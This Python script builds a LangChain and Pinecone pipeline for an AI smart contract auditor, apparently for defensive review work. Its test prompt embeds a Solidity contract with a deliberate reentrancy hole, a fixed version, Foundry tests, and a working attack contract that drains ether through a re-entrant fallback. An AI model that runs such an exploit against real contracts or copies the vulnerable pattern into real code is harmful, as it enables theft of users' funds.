from openai import OpenAI
from dotenv import load_dotenv
import os
from langchain.chat_models import ChatOpenAI
from langchain.schema import format_document
from langchain_core.messages import AIMessage, HumanMessage, get_buffer_string
from langchain_core.runnables import RunnableParallel
from langchain.prompts import ChatPromptTemplate
from langchain.prompts.prompt import PromptTemplate
from langchain_core.runnables import RunnableLambda, RunnablePassthrough
from langchain_core.output_parsers import StrOutputParser
from operator import itemgetter
from langchain.embeddings import OpenAIEmbeddings
from langchain.vectorstores import Pinecone
import pinecone

load_dotenv()

################################################
#  create llm
################################################
llm = ChatOpenAI(openai_api_key=os.getenv("OPENAI_API_KEY"))


################################################
#  vectore store
################################################
# initialize pinecone
pinecone.init(
    api_key=os.getenv("PINECONE_API_KEY"),  # find at app.pinecone.io
    environment=os.getenv("PINECONE_ENV"),  # next to api key in console
)

embeddings = OpenAIEmbeddings()

pinecone_store = Pinecone.from_existing_index("auditme", embeddings)

################################################
#  langchain pipeline
################################################
# Define a template string for the prompt that will be used to rephrase a question.
_template = """
Chat History:
{chat_history}
User Input: {question}"""

CONDENSE_QUESTION_PROMPT = PromptTemplate.from_template(_template)

# Define another template string for a prompt that will provide context and ask a question.
template = """You are a Smart Contract auditor. 
You have been provided the following RELEVANT_CODE, results from a vector search of known smart contract vulnerabilities based on the code in the USER QUESTION. 
Do not provide nor reference the RELEVANT_CODE in your response, only use it for helping identify vulnerabilities in USER QUESTION.

Answer the USER QUESTION, identifying any vulnerabilities, and a possible fixex. Provide code excerpts where possible.

ONLY indentify vulnerabilities in the USER QUESTION, not the RELEVANT_CODE.

RELEVANT_CODE: {context}

USER QUESTION: {question}
"""
ANSWER_PROMPT = ChatPromptTemplate.from_template(template)

# Use a default prompt template for formatting individual documents when needed.
DEFAULT_DOCUMENT_PROMPT = PromptTemplate.from_template(template="{page_content}")

# Create a retriever from the Chroma database, to be used for retrieving relevant documents.
# retriever = db.as_retriever()

# Define a function that combines multiple documents into a single string.
def _combine_documents(docs, document_prompt=DEFAULT_DOCUMENT_PROMPT, document_separator="\n\n"):
    doc_strings = [format_document(doc, document_prompt) for doc in docs]
    return document_separator.join(doc_strings)

# Set up a parallel runnable to process the standalone question formatting task.
_inputs = RunnableParallel(
    user_question=RunnablePassthrough.assign(
        chat_history=lambda x: get_buffer_string(x["chat_history"])
    )
    | CONDENSE_QUESTION_PROMPT
    | ChatOpenAI(temperature=0.3, max_tokens=2048)
    | StrOutputParser(),
)

# Define the context using the standalone question from the previous processing step,
# retrieve documents based on that context/question, and combine them.
_context = {
    "context": itemgetter("user_question") | pinecone_store.similarity_search() | _combine_documents,
    "question": lambda x: x["user_question"],
}

# Combine the inputs and context to form the conversational QA chain.
# This will use the rephrased question to retrieve documents, provide context, and generate an answer.
conversational_qa_chain = _inputs | _context | ANSWER_PROMPT | ChatOpenAI()

################################################
#  prompt the pipeline
################################################
# Invoke the conversational QA chain with an initial question and an empty chat history.
# This will process the question, search for relevant context, and attempt to provide an answer.
print("testing prompt...")
print(conversational_qa_chain.invoke(
    {
        "question": """Check for vulnerabilties in this smart contract:
            contract EtherStore {
                mapping(address => uint256) public balances;

                function deposit() public payable {
                    balances[msg.sender] += msg.value;
                }

                function withdrawFunds(uint256 _weiToWithdraw) public {
                    require(balances[msg.sender] >= _weiToWithdraw);
                    (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
                    require(send, "send failed");

                    // check if after send still enough to avoid underflow
                    if (balances[msg.sender] >= _weiToWithdraw) {
                        balances[msg.sender] -= _weiToWithdraw;
                    }
                }
            }

            contract EtherStoreRemediated {
                mapping(address => uint256) public balances;
                bool internal locked;

                modifier nonReentrant() {
                    require(!locked, "No re-entrancy");
                    locked = true;
                    _;
                    locked = false;
                }

                function deposit() public payable {
                    balances[msg.sender] += msg.value;
                }

                function withdrawFunds(uint256 _weiToWithdraw) public nonReentrant {
                    require(balances[msg.sender] >= _weiToWithdraw);
                    balances[msg.sender] -= _weiToWithdraw;
                    (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
                    require(send, "send failed");
                }
            }

            contract ContractTest is Test {
                EtherStore store;
                EtherStoreRemediated storeRemediated;
                EtherStoreAttack attack;
                EtherStoreAttack attackRemediated;

                function setUp() public {
                    store = new EtherStore();
                    storeRemediated = new EtherStoreRemediated();
                    attack = new EtherStoreAttack(address(store));
                    attackRemediated = new EtherStoreAttack(address(storeRemediated));
                    vm.deal(address(store), 5 ether);
                    vm.deal(address(storeRemediated), 5 ether);
                    vm.deal(address(attack), 2 ether);
                    vm.deal(address(attackRemediated), 2 ether);
                }

                function testReentrancy() public {
                    attack.Attack();
                }

                function testFailRemediated() public {
                    attackRemediated.Attack();
                }
            }

            contract EtherStoreAttack is Test {
                EtherStore store;

                constructor(address _store) {
                    store = EtherStore(_store);
                }

                function Attack() public {
                    console.log("EtherStore balance", address(store).balance);

                    store.deposit{value: 1 ether}();

                    console.log(
                        "Deposited 1 Ether, EtherStore balance",
                        address(store).balance
                    );
                    store.withdrawFunds(1 ether); // exploit here

                    console.log("Attack contract balance", address(this).balance);
                    console.log("EtherStore balance", address(store).balance);
                }

                // fallback() external payable {}

                // we want to use fallback function to exploit reentrancy
                receive() external payable {
                    console.log("Attack contract balance", address(this).balance);
                    console.log("EtherStore balance", address(store).balance);
                    if (address(store).balance >= 1 ether) {
                        store.withdrawFunds(1 ether); // exploit here
                    }
                }
            }""",
        "chat_history": [],
    }
).content)